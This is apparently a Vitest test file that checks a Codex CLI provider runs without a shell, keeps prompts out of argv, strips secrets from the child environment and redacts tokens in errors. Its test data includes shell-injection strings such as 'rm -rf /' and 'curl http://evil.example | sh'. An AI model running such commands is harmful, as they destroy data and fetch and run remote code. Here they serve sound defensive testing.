import { EventEmitter } from "node:events";
import { writeFileSync } from "node:fs";
import { mkdir, mkdtemp, readFile, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Readable, Writable } from "node:stream";
import { inspect } from "node:util";
import { expect, it } from "vitest";
import { recordedModel } from "../src/bench/run.js";
import { runCli, type CliIo } from "../src/cli.js";
import { providerUnavailableMessage, resolveProviderConfig } from "../src/providers/config.js";
import {
  CODEX_DEFAULT_TIMEOUT_MS,
  CODEX_MAX_CONCURRENCY,
  CODEX_PROMPT_PREAMBLE,
  buildCodexExecArgs,
  buildCodexPrompt,
  codexChildEnv,
} from "../src/providers/codex.js";
import type { CodexChild, CodexSpawn, CodexSpawnOptions } from "../src/providers/definition.js";
import {
  ProviderAbortedError,
  ProviderCliError,
  ProviderRequestError,
  ProviderResponseError,
  ProviderTimeoutError,
} from "../src/providers/errors.js";
import { createProvider } from "../src/providers/registry.js";
import { parseCandidateList } from "../src/schema/candidate.js";
import type { CompleteInput } from "../src/providers/types.js";
import { verdictSchema } from "../src/validator/index.js";

const PAYLOAD = `$(rm -rf /); "; curl http://evil.example | sh #\n\`id\` && echo CANDIDATE_INJECT`;
const TOKEN = "sk-ant-api03-NEVERPRINTTHIS000";
const JWT = "eyJhbGciOiJub25lIn0.eyJ0b2tlbiI6InNlY3JldCJ9.abcdefghij";
const VERDICT = `${JSON.stringify({
  verdict: "uncertain",
  summary: "no proof in the fenced source",
  evidence: [{ file: "src/app.ts", line: 1, note: "cited line" }],
})}\n`;

class FakeCodex extends EventEmitter implements CodexChild {
  readonly stdinChunks: Buffer[] = [];
  readonly stdin = new Writable({
    write: (chunk: Buffer | string, _encoding, callback) => {
      this.stdinChunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
      callback();
    },
  });
  readonly stdout = new Readable({ read() {} });
  readonly stderr = new Readable({ read() {} });

  kill(signal?: NodeJS.Signals): boolean {
    this.emit("close", null, signal ?? "SIGTERM");
    return true;
  }

  stdinText(): string {
    return Buffer.concat(this.stdinChunks).toString("utf8");
  }

  finish(code: number, stdout = "", stderr = ""): void {
    if (stdout.length > 0) {
      this.stdout.push(stdout);
    }
    this.stdout.push(null);
    if (stderr.length > 0) {
      this.stderr.push(stderr);
    }
    this.stderr.push(null);
    this.emit("close", code, null);
  }

  failSpawn(code: string): void {
    const error = new Error(`spawn failed ${code}`) as Error & { code: string };
    error.code = code;
    this.emit("error", error);
  }
}

interface Recorded {
  bin: string;
  args: readonly string[];
  cwd: string;
  shell: false;
  env: NodeJS.ProcessEnv;
  stdin: string;
}

function input(content: string, jsonSchema?: unknown): CompleteInput {
  return {
    messages: [
      { role: "system", content: "Return one JSON object and nothing else." },
      { role: "user", content },
    ],
    ...(jsonSchema === undefined ? {} : { jsonSchema }),
  };
}

function dumpError(error: unknown): string {
  return [String(error), inspect(error, { depth: 6, showHidden: true })].join("\n");
}

function scripted(options: {
  loginCode?: number;
  loginStderr?: string;
  execCode?: number;
  execStderr?: string;
  file?: string;
  stdout?: string;
  hang?: "login" | "exec";
  spawnError?: string;
}): { spawn: CodexSpawn; calls: Recorded[] } {
  const calls: Recorded[] = [];
  const spawn: CodexSpawn = (bin, args, spawnOptions) => {
    const record: Recorded = {
      bin,
      args,
      cwd: spawnOptions.cwd,
      shell: spawnOptions.shell,
      env: spawnOptions.env,
      stdin: "",
    };
    calls.push(record);
    const child = new FakeCodex();
    queueMicrotask(() => {
      record.stdin = child.stdinText();
      if (options.spawnError !== undefined && args[0] === "login") {
        child.failSpawn(options.spawnError);
        return;
      }
      if (args[0] === "login") {
        if (options.hang === "login") {
          return;
        }
        child.finish(options.loginCode ?? 0, "", options.loginStderr ?? "");
        return;
      }
      if (options.hang === "exec") {
        return;
      }
      const flag = args.indexOf("--output-last-message");
      const output = flag >= 0 ? args[flag + 1] : undefined;
      if (output !== undefined && options.file !== undefined) {
        writeFileSync(output, options.file);
      }
      child.finish(options.execCode ?? 0, options.stdout ?? "", options.execStderr ?? "");
    });
    return child;
  };
  return { spawn, calls };
}

async function settle(): Promise<void> {
  await new Promise((resolve) => {
    setTimeout(resolve, 20);
  });
}

it("does not require an API key and passes the model and binary through", () => {
  expect(providerUnavailableMessage({ name: "codex" })).toBeUndefined();
  expect(
    resolveProviderConfig("Codex", { FAULTLINE_CODEX_BIN: "  /opt/codex  " }, " gpt-5.4 "),
  ).toEqual({
    name: "codex",
    model: "gpt-5.4",
    codexBin: "/opt/codex",
  });
  expect(recordedModel({ name: "codex" })).toBeNull();
  expect(recordedModel({ name: "codex", model: "gpt-5.4" })).toBe("gpt-5.4");
  expect(CODEX_DEFAULT_TIMEOUT_MS).toBe(120_000);
  expect(CODEX_MAX_CONCURRENCY).toBe(2);
  const args = buildCodexExecArgs({
    cwd: "/tmp/empty",
    outputFile: "/tmp/empty/last-message.txt",
    model: "gpt-5.4",
  });
  expect(args.at(-1)).toBe("-");
  expect(args).toContain("-m");
  expect(args[args.indexOf("-m") + 1]).toBe("gpt-5.4");
  expect(buildCodexPrompt(input(PAYLOAD).messages)).toContain(CODEX_PROMPT_PREAMBLE);
  expect(buildCodexPrompt(input(PAYLOAD).messages)).toContain("pure text JSON");
});

it("returns the final message for the existing zod parsers", async () => {
  const home = await mkdtemp(join(tmpdir(), "faultline-codex-home-"));
  const canary = `codex-auth-canary-${TOKEN}`;
  await mkdir(join(home, ".codex"), { recursive: true });
  await writeFile(
    join(home, ".codex", "auth.json"),
    JSON.stringify({ tokens: { access_token: canary, id_token: JWT } }),
  );
  const { spawn, calls } = scripted({ file: '{"candidates":[]}\n' });
  const provider = createProvider("codex", {
    model: "gpt-5.4",
    codexBin: "codex; rm -rf /",
    codexSpawn: spawn,
    timeoutMs: 5_000,
    codexEnv: {
      PATH: "/usr/bin",
      HOME: home,
      FAULTLINE_API_KEY: "super-secret-key-not-for-logs",
      OPENAI_API_KEY: TOKEN,
      CODEX_API_KEY: TOKEN,
      HTTPS_PROXY: "http://user:pass@proxy.example",
    },
  });
  const text = await provider.complete(input(PAYLOAD, { title: "SCHEMA_MARKER_DO_NOT_SEND" }));
  expect(text).toBe('{"candidates":[]}\n');
  expect(parseCandidateList(text)).toEqual([]);
  expect(calls).toHaveLength(2);
  const login = calls[0];
  const exec = calls[1];
  expect(login?.args).toEqual(["login", "status"]);
  expect(login?.shell).toBe(false);
  expect(login?.bin).toBe("codex; rm -rf /");
  expect(exec?.shell).toBe(false);
  expect(Array.isArray(exec?.args)).toBe(true);
  expect(exec?.args.at(-1)).toBe("-");
  expect(exec?.args).toContain("--sandbox");
  expect(exec?.args[exec.args.indexOf("--sandbox") + 1]).toBe("read-only");
  expect(exec?.args).toContain("--ephemeral");
  expect(exec?.args).toContain("--skip-git-repo-check");
  expect(exec?.args).toContain("--ignore-user-config");
  expect(exec?.args).toContain("--ignore-rules");
  expect(exec?.args).toContain('approval_policy="never"');
  expect(exec?.args).toContain("sandbox_workspace_write.network_access=false");
  expect(exec?.args).toContain('web_search="disabled"');
  expect(exec?.args[exec.args.indexOf("-m") + 1]).toBe("gpt-5.4");
  expect(exec?.args[exec.args.indexOf("--cd") + 1]).toBe(exec?.cwd);
  expect(exec?.cwd.startsWith(tmpdir())).toBe(true);
  expect(exec?.cwd).not.toBe(process.cwd());
  const flatArgs = exec?.args.join("\n") ?? "";
  expect(flatArgs).not.toContain(PAYLOAD);
  expect(flatArgs).not.toContain("SCHEMA_MARKER_DO_NOT_SEND");
  expect(flatArgs).not.toContain(canary);
  expect(exec?.stdin).toContain(PAYLOAD);
  expect(exec?.stdin).toContain("pure text JSON");
  expect(exec?.stdin).not.toContain("SCHEMA_MARKER_DO_NOT_SEND");
  expect(exec?.stdin).not.toContain(canary);
  expect(exec?.env["OPENAI_API_KEY"]).toBeUndefined();
  expect(exec?.env["FAULTLINE_API_KEY"]).toBeUndefined();
  expect(exec?.env["CODEX_API_KEY"]).toBeUndefined();
  expect(exec?.env["HTTPS_PROXY"]).toBeUndefined();
  expect(exec?.env["HOME"]).toBe(home);
  expect(exec?.env["PATH"]).toBe("/usr/bin");
  expect(JSON.stringify(exec?.env)).not.toContain(TOKEN);
  expect(JSON.stringify(exec?.env)).not.toContain(canary);
  await expect(stat(exec?.cwd ?? "")).rejects.toThrow();
  expect(inspect(provider, { showHidden: true, depth: 6 })).not.toContain(TOKEN);
  expect(inspect(provider, { showHidden: true, depth: 6 })).not.toContain(canary);
  const source = await readFile(new URL("../src/providers/codex.ts", import.meta.url), "utf8");
  expect(source).not.toContain("auth.json");
  expect(source).not.toContain("execFile");
  expect(source).not.toContain("execSync");
  expect(source).not.toContain("shell: true");
  expect(source).toContain("shell: false");
});

it("parses a validator verdict from the final message with the existing schema", async () => {
  const { spawn } = scripted({ file: VERDICT });
  const provider = createProvider("codex", { codexSpawn: spawn, timeoutMs: 5_000 });
  const text = await provider.complete(input("disprove this"));
  const parsed = verdictSchema.safeParse(JSON.parse(text) as unknown);
  expect(parsed.success).toBe(true);
});

it("returns malformed final text so the existing zod parsers drop it", async () => {
  const malformed = "not json { candidates";
  const { spawn } = scripted({ file: malformed });
  const provider = createProvider("codex", { codexSpawn: spawn, timeoutMs: 5_000 });
  const text = await provider.complete(input(PAYLOAD));
  expect(text).toBe(malformed);
  expect(parseCandidateList(text)).toEqual([]);
  expect(() => JSON.parse(text)).toThrow();
});

it("rejects a JSONL stream that has no final message", async () => {
  const { spawn } = scripted({
    stdout: `${JSON.stringify({
      type: "item.completed",
      item: { type: "command_execution", command: TOKEN },
    })}\n`,
  });
  const provider = createProvider("codex", { codexSpawn: spawn, timeoutMs: 5_000 });
  const error = await provider.complete(input("x")).catch((caught: unknown) => caught);
  expect(error).toBeInstanceOf(ProviderResponseError);
  expect(dumpError(error)).not.toContain(TOKEN);
  expect(dumpError(error)).toContain("no final message");
});

it("uses a JSONL agent message when the output file is empty", async () => {
  const { spawn } = scripted({
    stdout: [
      JSON.stringify({ type: "turn.started" }),
      JSON.stringify({
        type: "item.completed",
        item: { type: "agent_message", text: '{"candidates":[]}' },
      }),
    ].join("\n"),
  });
  const provider = createProvider("codex", { codexSpawn: spawn, timeoutMs: 5_000 });
  await expect(provider.complete(input("x"))).resolves.toBe('{"candidates":[]}');
});

it("reports a non-zero exit without the token in stderr", async () => {
  const { spawn, calls } = scripted({
    execCode: 2,
    execStderr: `boom ${TOKEN} Bearer ${JWT} OPENAI_API_KEY=${TOKEN}`,
  });
  const provider = createProvider("codex", { codexSpawn: spawn, timeoutMs: 5_000 });
  const error = await provider.complete(input("x")).catch((caught: unknown) => caught);
  expect(error).toBeInstanceOf(ProviderRequestError);
  expect((error as ProviderRequestError).code).toBe("network");
  const dumped = dumpError(error);
  expect(dumped).toContain("status 2");
  expect(dumped).toContain("[redacted]");
  expect(dumped).not.toContain(TOKEN);
  expect(dumped).not.toContain(JWT);
  expect(calls.some((call) => call.args[0] === "exec")).toBe(true);
});

it("times out without leaking stderr", async () => {
  const calls: Recorded[] = [];
  const spawn: CodexSpawn = (bin, args, spawnOptions) => {
    calls.push({
      bin,
      args,
      cwd: spawnOptions.cwd,
      shell: spawnOptions.shell,
      env: spawnOptions.env,
      stdin: "",
    });
    const child = new FakeCodex();
    queueMicrotask(() => {
      child.stderr.push(`still going ${TOKEN}`);
    });
    return child;
  };
  const provider = createProvider("codex", { codexSpawn: spawn, timeoutMs: 200 });
  const error = await provider.complete(input("x")).catch((caught: unknown) => caught);
  expect(error).toBeInstanceOf(ProviderTimeoutError);
  expect((error as ProviderTimeoutError).code).toBe("timeout");
  expect(dumpError(error)).not.toContain(TOKEN);
  expect(calls.every((call) => call.args[0] === "login")).toBe(true);
});

it("fails clearly when codex is not logged in and does not exec", async () => {
  const { spawn, calls } = scripted({
    loginCode: 1,
    loginStderr: `Not logged in ${TOKEN}`,
  });
  const provider = createProvider("codex", { codexSpawn: spawn, timeoutMs: 5_000 });
  const error = await provider.complete(input(PAYLOAD)).catch((caught: unknown) => caught);
  expect(error).toBeInstanceOf(ProviderCliError);
  const dumped = dumpError(error);
  expect(dumped).toContain("codex is not logged in");
  expect(dumped).toContain("codex login");
  expect(dumped).not.toContain(TOKEN);
  expect(dumped).toContain("[redacted]");
  expect(calls.map((call) => call.args[0])).toEqual(["login"]);
});

it("fails clearly when the codex binary is missing", async () => {
  const { spawn, calls } = scripted({ spawnError: "ENOENT" });
  const provider = createProvider("codex", {
    codexBin: "missing-codex",
    codexSpawn: spawn,
    timeoutMs: 5_000,
  });
  const error = await provider.complete(input("x")).catch((caught: unknown) => caught);
  expect(error).toBeInstanceOf(ProviderCliError);
  expect(dumpError(error)).toContain("Codex CLI was not found (missing-codex)");
  expect(dumpError(error)).toContain("codex login");
  expect(calls).toHaveLength(1);
});

it("keeps candidate content out of argv even when the model looks like a shell snippet", async () => {
  const model = "gpt-5;$(id)";
  const { spawn, calls } = scripted({ file: '{"candidates":[]}' });
  const provider = createProvider("codex", {
    model,
    codexSpawn: spawn,
    timeoutMs: 5_000,
  });
  await provider.complete(input(PAYLOAD));
  const exec = calls.find((call) => call.args[0] === "exec");
  expect(exec).toBeDefined();
  expect(exec?.shell).toBe(false);
  expect(exec?.args[exec.args.indexOf("-m") + 1]).toBe(model);
  expect(exec?.args.join("\0")).not.toContain(PAYLOAD);
  expect(exec?.stdin).toContain(PAYLOAD);
  for (const arg of exec?.args ?? []) {
    expect(arg).not.toContain(PAYLOAD);
  }
});

it("caps output and does not return the oversized body", async () => {
  const { spawn } = scripted({ stdout: `${"A".repeat(80)}${TOKEN}` });
  const provider = createProvider("codex", {
    codexSpawn: spawn,
    timeoutMs: 5_000,
    codexMaxOutputBytes: 16,
  });
  const error = await provider.complete(input("x")).catch((caught: unknown) => caught);
  expect(error).toBeInstanceOf(ProviderResponseError);
  const dumped = dumpError(error);
  expect(dumped).toContain("byte limit");
  expect(dumped).not.toContain(TOKEN);
  expect(dumped).not.toContain("AAAA");
});

it("refuses an aborted call and a prompt over the byte cap before spawn", async () => {
  let spawned = false;
  const spawn: CodexSpawn = () => {
    spawned = true;
    return new FakeCodex();
  };
  const provider = createProvider("codex", { codexSpawn: spawn, timeoutMs: 5_000 });
  const controller = new AbortController();
  controller.abort(TOKEN);
  const aborted = await provider
    .complete({ ...input("x"), signal: controller.signal })
    .catch((caught: unknown) => caught);
  expect(aborted).toBeInstanceOf(ProviderAbortedError);
  expect(dumpError(aborted)).not.toContain(TOKEN);
  const huge = await provider
    .complete(input("y".repeat(2_000_001)))
    .catch((caught: unknown) => caught);
  expect(huge).toBeInstanceOf(ProviderRequestError);
  expect(dumpError(huge)).toContain("prompt exceeds");
  expect(spawned).toBe(false);
});

it("runs at most two codex processes at once", async () => {
  let inFlight = 0;
  let maxInFlight = 0;
  const pending: Array<{ args: readonly string[]; finish: () => void }> = [];
  const spawn: CodexSpawn = (bin, args, spawnOptions: CodexSpawnOptions) => {
    inFlight += 1;
    maxInFlight = Math.max(maxInFlight, inFlight);
    const child = new FakeCodex();
    pending.push({
      args,
      finish: () => {
        inFlight -= 1;
        const flag = args.indexOf("--output-last-message");
        const output = flag >= 0 ? args[flag + 1] : undefined;
        if (output !== undefined) {
          writeFileSync(output, '{"candidates":[]}');
        }
        expect(spawnOptions.shell).toBe(false);
        expect(spawnOptions.cwd.startsWith(tmpdir())).toBe(true);
        child.finish(0, "", "");
      },
    });
    return child;
  };
  const provider = createProvider("codex", { codexSpawn: spawn, timeoutMs: 5_000 });
  let done = false;
  const work = Promise.all([0, 1, 2].map(() => provider.complete(input("ping")))).then((texts) => {
    done = true;
    return texts;
  });
  const started = Date.now();
  while (!done) {
    expect(inFlight).toBeLessThanOrEqual(2);
    const batch = pending.splice(0, pending.length);
    expect(batch.length).toBeLessThanOrEqual(2);
    for (const item of batch) {
      item.finish();
    }
    if (Date.now() - started > 3_000) {
      throw new Error(`codex concurrency did not finish (inFlight=${inFlight})`);
    }
    await settle();
  }
  await expect(work).resolves.toEqual([
    '{"candidates":[]}',
    '{"candidates":[]}',
    '{"candidates":[]}',
  ]);
  expect(maxInFlight).toBe(2);
});

it("scan with a missing codex binary does not require an API key or write findings", async () => {
  const dir = await mkdtemp(join(tmpdir(), "faultline-codex-scan-"));
  await mkdir(join(dir, "src"));
  const out: string[] = [];
  const err: string[] = [];
  const io: CliIo = {
    cwd: dir,
    stdout: (text) => {
      out.push(text);
    },
    stderr: (text) => {
      err.push(text);
    },
    env: {
      PATH: process.env["PATH"] ?? "/usr/bin",
      HOME: dir,
      FAULTLINE_PROVIDER: "codex",
      FAULTLINE_CODEX_BIN: join(dir, "missing-codex-binary"),
      FAULTLINE_API_KEY: TOKEN,
      OPENAI_API_KEY: TOKEN,
    },
  };
  expect(await runCli(["scan", "src", "--out", "out"], io)).toBe(1);
  const stderr = err.join("");
  expect(stderr).toContain("Codex CLI was not found");
  expect(stderr).toContain("codex login");
  expect(stderr).not.toContain(TOKEN);
  expect(out.join("")).not.toContain(TOKEN);
  await expect(stat(join(dir, "out", "findings.json"))).rejects.toThrow();
});

it("drops proxy userinfo and keeps a proxy without credentials", () => {
  const env = codexChildEnv({
    PATH: "/bin",
    HTTPS_PROXY: "http://user:pass@proxy.example",
    NO_PROXY: "localhost",
    OPENAI_API_KEY: TOKEN,
  });
  expect(env["HTTPS_PROXY"]).toBeUndefined();
  expect(env["NO_PROXY"]).toBe("localhost");
  expect(env["OPENAI_API_KEY"]).toBeUndefined();
  expect(env["PATH"]).toBe("/bin");
});
